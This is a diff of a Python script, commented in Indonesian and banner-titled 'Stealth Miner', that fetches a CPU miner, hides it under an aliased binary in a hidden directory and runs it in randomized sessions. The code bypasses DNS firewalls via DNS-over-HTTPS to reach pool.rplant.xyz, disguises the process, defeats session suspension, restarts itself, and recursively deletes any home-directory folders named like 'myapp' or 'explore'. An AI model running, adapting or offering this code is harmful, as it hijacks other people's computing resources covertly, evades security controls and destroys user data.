@@ -9,8 +9,8 @@ import threading
 import shutil
 import sys
 import random
-import signal
 
+# === KONFIGURASI ===
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
@@ -26,12 +26,37 @@ MAX_DURATION = 720
 MIN_PAUSE = 120
 MAX_PAUSE = 240
 COOLDOWN_DURATION = 180
-
 LOCKFILE = "/tmp/.mining_lock"
+
 cooldown_restart_counter = 0
 cooldown_restart_limit = 3
 cooldown_reset_time = time.time() + 3600
 
+# === ANTI-SUSPEND ===
+def anti_suspend():
+    while True:
+        try:
+            sys.stdout.write("\b")
+            sys.stdout.flush()
+        except:
+            pass
+        time.sleep(15)
+
+# === BYPASS DNS FIREWALL ===
+def dns_doh_bypass():
+    subprocess.call([
+        "curl", "-s", "-H", "accept: application/dns-json",
+        "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# === CEK CPU 100% ===
+def is_cpu_100_percent():
+    try:
+        return os.getloadavg()[0] >= os.cpu_count()
+    except:
+        return False
+
+# === PROTEKSI NAMA PROSES ===
 def protect_process():
     try:
         if hasattr(os, 'setsid'):
@@ -42,35 +67,27 @@ def protect_process():
     except:
         pass
 
-def anti_suspend():
-    while True:
-        try:
-            sys.stdout.write("\b")
-            sys.stdout.flush()
-        except:
-            pass
-        time.sleep(15)
+# === HAPUS EXPLORER / MYAPP ===
+def clean_explorer_myapp():
+    home = os.path.expanduser("~")
+    for root, dirs, _ in os.walk(home):
+        for d in dirs:
+            if "myapp" in d.lower() or "explore" in d.lower():
+                try:
+                    shutil.rmtree(os.path.join(root, d))
+                except:
+                    continue
 
-def dns_doh_bypass():
-    try:
-        subprocess.call([
-            "curl", "-s", "-H", "accept: application/dns-json",
-            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
+def clean_miner_cache():
+    if os.path.exists(TARFILE):
+        os.remove(TARFILE)
+    if os.path.exists(HIDDEN_DIR):
+        shutil.rmtree(HIDDEN_DIR)
 
-def is_cpu_100_percent():
-    try:
-        load = os.getloadavg()[0]
-        cores = os.cpu_count()
-        return load >= cores
-    except:
-        return False
-
+# === CEK LOCKFILE ===
 def check_lock():
     if os.path.exists(LOCKFILE):
-        print("[🔒] Mining sudah aktif.")
+        print("[🔒] Sudah berjalan.")
         sys.exit(0)
     with open(LOCKFILE, "w") as f:
         f.write(str(os.getpid()))
@@ -92,28 +109,11 @@ def should_restart():
         return True
     return False
 
-def clean_explorer_myapp():
-    home = os.path.expanduser("~")
-    for root, dirs, _ in os.walk(home):
-        for d in dirs:
-            if "myapp" in d.lower() or "explore" in d.lower():
-                try:
-                    shutil.rmtree(os.path.join(root, d))
-                except:
-                    continue
-
-def clean_miner_cache():
-    try:
-        if os.path.exists(TARFILE):
-            os.remove(TARFILE)
-        if os.path.exists(HIDDEN_DIR):
-            shutil.rmtree(HIDDEN_DIR)
-    except:
-        pass
-
+# === 1 SESI MINING ===
 def run_one_session():
     os.makedirs(HIDDEN_DIR, exist_ok=True)
     urllib.request.urlretrieve(URL, TARFILE)
+
     with tarfile.open(TARFILE) as tar:
         tar.extractall()
     hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
@@ -131,11 +131,11 @@ def run_one_session():
     time.sleep(10)
     os.remove(TARFILE)
 
-    start_time = time.time()
-    while time.time() - start_time < duration:
+    start = time.time()
+    while time.time() - start < duration:
         time.sleep(10)
         if is_cpu_100_percent():
-            print("[⚠️] CPU 100%! Cooldown...")
+            print(f"[⚠️] CPU 100%! Cooldown {COOLDOWN_DURATION}s...")
             proc.terminate()
             try:
                 proc.wait(timeout=10)
@@ -146,20 +146,22 @@ def run_one_session():
                 restart_script()
             else:
                 return
+
     proc.terminate()
     try:
         proc.wait(timeout=10)
     except:
         proc.kill()
 
+# === LOOP UTAMA ===
 def main_loop():
     while True:
         run_one_session()
         pause = random.randint(MIN_PAUSE, MAX_PAUSE)
-        print(f"[⏳] Pause {pause}s...
-")
+        print(f"[⏳] Pause {pause}s...\n")
         time.sleep(pause)
 
+# === RESTART SCRIPT ===
 def restart_script():
     try:
         print("[🔁] Restart aman...")
@@ -171,6 +173,7 @@ def restart_script():
     except Exception as e:
         print(f"[X] Gagal restart: {e}")
 
+# === EKSEKUSI UTAMA ===
 if __name__ == "__main__":
     check_lock()
     print("⛏️  Stealth Miner Aktif: Proteksi + Restart + Cooldown")
